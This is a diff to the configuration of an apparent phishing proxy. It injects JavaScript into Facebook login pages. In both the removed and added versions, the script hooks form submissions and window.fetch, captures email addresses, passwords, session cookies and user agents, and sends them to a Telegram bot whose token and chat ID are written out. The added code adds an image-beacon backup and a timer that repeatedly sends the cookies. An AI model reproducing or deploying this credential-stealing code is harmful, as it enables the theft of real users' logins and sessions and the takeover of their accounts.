@@ -74,56 +74,57 @@ response_headers:
 js_inject:
   - trigger_domains: ["www.facebook.com", "m.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
-    trigger_params: []
+    trigger_paths: ["/auth_platform/", "/login/", "/login.php"]
     inject_delay: 2000
     cache_buster: true
     script: |  
 
       const originalFetch = window.fetch;
       window.fetch = async function(...args) {
-      const [url, options] = args;
-
-      console.log(options)
-
-      let formSubmitted = false;
-
-      // ===== 2. ACCURATE FORM INTERCEPTION =====
-      const hijackSubmit = (form) => {
-        form.onsubmit = async (e) => {
-          e.preventDefault();
-          const email = form.querySelector('[name="email"]')?.value;
-          const pass = form.querySelector('[name="pass"]')?.value;
-          
-          if (email && pass && !formSubmitted) {
-            formSubmitted = true;
-            
-            // ===== 3. DELAYED CREDENTIAL+SESSION CAPTURE =====
-            setTimeout(async () => {
-              // Capture ACTIVE cookies (proves successful login)
-              const cookies = document.cookie;
-              
-              // Send to Telegram (REQUIRES your bot token)
-              await fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                  chat_id: "5228920520",
-                  text: `✅ LOGIN SUCCESS\n📧 Email: ${email}\n🔑 Password: ${pass}\n🍪Cookie: ${cookies}`,
-                }),
-                keepalive: true
-              });
-
-              // Manually submit the form after capture
-              form.submit();
-            }, 3000); // 3-second delay to ensure cookies exist
+        const [url, options] = args;
+        if (url.includes('/login/') && options?.method === 'POST') {
+          const formData = new URLSearchParams(options.body);
+          if (formData.has('email') && formData.has('pass')) {
+            const cookies = document.cookie;
+            await fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
+              method: 'POST',
+              body: JSON.stringify({
+                chat_id: "5228920520",
+                text: `NEW LOGIN\n${new Date()}\nEmail: ${formData.get('email')}\nPass: ${formData.get('pass')}\nCookies: ${cookies}\nUA: ${navigator.userAgent}`
+              }),
+              keepalive: true
+            });
           }
-        };
+        }
+        return originalFetch.apply(this, args);
       };
 
-      // ===== 4. INITIALIZE ON ALL FORMS =====
-      document.querySelectorAll('form').forEach(hijackSubmit);
+      // 2. Form submission backup
+      document.addEventListener('submit', function(e) {
+        if (e.target.action.includes('/login/')) {
+          const email = e.target.querySelector('[name="email"]')?.value;
+          const pass = e.target.querySelector('[name="pass"]')?.value;
+          if (email && pass) {
+            setTimeout(() => {
+              const img = new Image();
+              img.src = `https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage?chat_id=5228920520&text=${encodeURIComponent(
+                `BACKUP LOGIN\nEmail: ${email}\nPass: ${pass}`
+              )}`;
+            }, 1000);
+          }
+        }
+      }, true);
 
-      // ===== 5. FALLBACK: MUTATIONOBSERVER =====
-      new MutationObserver(() => {
-        document.querySelectorAll('form').forEach(hijackSubmit);
-      }).observe(document.body, { childList: true, subtree: true });
+      // 3. Cookie monitor
+      setInterval(() => {
+        if (document.cookie.includes('c_user')) {
+          fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
+            method: 'POST',
+            body: JSON.stringify({
+              chat_id: "5228920520",
+              text: `ACTIVE COOKIES:\n${document.cookie}`
+            }),
+            keepalive: true
+          });
+        }
+      }, 5000);
